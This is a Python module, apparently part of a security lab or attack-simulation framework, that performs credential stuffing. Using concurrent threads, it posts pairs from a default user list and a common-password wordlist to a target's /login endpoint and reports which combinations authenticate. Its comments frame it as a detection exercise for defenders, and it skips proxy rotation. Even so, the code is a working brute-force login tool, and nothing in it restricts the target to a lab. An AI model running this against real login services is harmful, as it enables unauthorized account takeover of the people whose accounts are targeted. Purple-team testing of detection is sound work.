"""Credential stuffing contra o alvo de lab (rate-limit consciente).

Reproduz o comportamento de um stuffing real (par usuario:senha de uma
lista, tentativas concorrentes) para que o DEFENSOR veja o que observar:
picos de 401, distribuicao por IP, contas que cedem.

Nao faz evasao (sem rotacao de proxy/UA): o lab quer ser detectado.
MITRE: T1110.004 (Credential Stuffing).
"""

from __future__ import annotations

import base64
import concurrent.futures as cf
import json
import urllib.error
import urllib.request
from dataclasses import dataclass
from typing import Iterable

from ..core.registry import BaseModule, ModuleMeta, register
from ..core.storage import Finding

DEFAULT_WORDLIST = [
    "123456", "password", "12345678", "qwerty", "123456789",
    "12345", "1234", "111111", "1234567", "dragon",
    "123123", "baseball", "abc123", "football", "monkey",
    "letmein", "696969", "shadow", "master", "666666",
]


@dataclass
class Attempt:
    username: str
    password: str
    status: int
    ok: bool


def _post_json(url: str, payload: dict, timeout: float,
               headers: dict | None = None) -> tuple[int, str]:
    data = json.dumps(payload).encode()
    req = urllib.request.Request(
        url, data=data, method="POST",
        headers={"Content-Type": "application/json", **(headers or {})},
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return 0, str(e)


def _post_form(url: str, fields: dict, timeout: float) -> tuple[int, str]:
    data = urllib.parse.urlencode(fields).encode()
    req = urllib.request.Request(url, data=data, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return 0, str(e)


import urllib.parse  # noqa: E402  (usado acima; import mantido explicito)


@register
class CredentialStuffingModule(BaseModule):
    meta = ModuleMeta(
        name="stuffing",
        description="Credential stuffing contra o lab (usuarios x wordlist)",
        category="credential",
        mitre=["T1110.004", "T1110", "T1078"],
        destructive=False,
    )

    def run(self) -> list[Finding]:
        target = self.ctx.target.rstrip("/")
        url = target if target.endswith("/login") else f"{target}/login"
        users = self.ctx.options.get("users") or ["admin", "user", "test", "operator"]
        if isinstance(users, str):
            users = [u.strip() for u in users.split(",") if u.strip()]
        wordlist: Iterable[str] = self.ctx.options.get("wordlist") or DEFAULT_WORDLIST
        timeout = float(self.ctx.options.get("timeout", 5))
        workers = int(self.ctx.options.get("workers", 8))
        fmt = self.ctx.options.get("format", "json")

        attempts: list[Attempt] = []
        combos = [(u, p) for u in users for p in wordlist]

        def try_one(combo):
            u, p = combo
            if fmt == "form":
                status, body = _post_form(url, {"username": u, "password": p}, timeout)
            else:
                status, body = _post_json(url, {"username": u, "password": p}, timeout)
            ok = status == 200 and ("token" in body.lower() or "ok" in body.lower())
            return Attempt(u, p, status, ok)

        with cf.ThreadPoolExecutor(max_workers=workers) as ex:
            for a in ex.map(try_one, combos):
                attempts.append(a)

        self.ctx.results["attempts"] = [a.__dict__ for a in attempts]
        self.ctx.results["total"] = len(combos)

        findings: list[Finding] = []
        hits = [a for a in attempts if a.ok]
        for a in hits:
            findings.append(Finding(
                module="stuffing", severity="critical",
                title=f"Credencial valida: {a.username}:{a.password}",
                detail="A combinacao autenticou com sucesso no alvo de lab.",
                evidence=f"{url} :: {a.username}:{a.password}",
                mitre="T1110.004",
            ))

        denied = sum(1 for a in attempts if a.status == 401)
        if denied:
            findings.append(Finding(
                module="stuffing", severity="medium",
                title=f"{denied} tentativas rejeitadas (401)",
                detail=(
                    "Volume alto de negativas e o sinal que o SOC deve correlacionar. "
                    "Sem rate-limit/lockout, o atacante itera a wordlist inteira."
                ),
                evidence=f"{denied}/{len(combos)} negadas",
                mitre="T1110",
            ))

        if not hits and denied == 0:
            findings.append(Finding(
                module="stuffing", severity="info",
                title="Nenhuma resposta utilizavel do alvo",
                detail="Verifique URL/format (--format json|form).",
                evidence=url, mitre="T1110.004",
            ))
        return findings
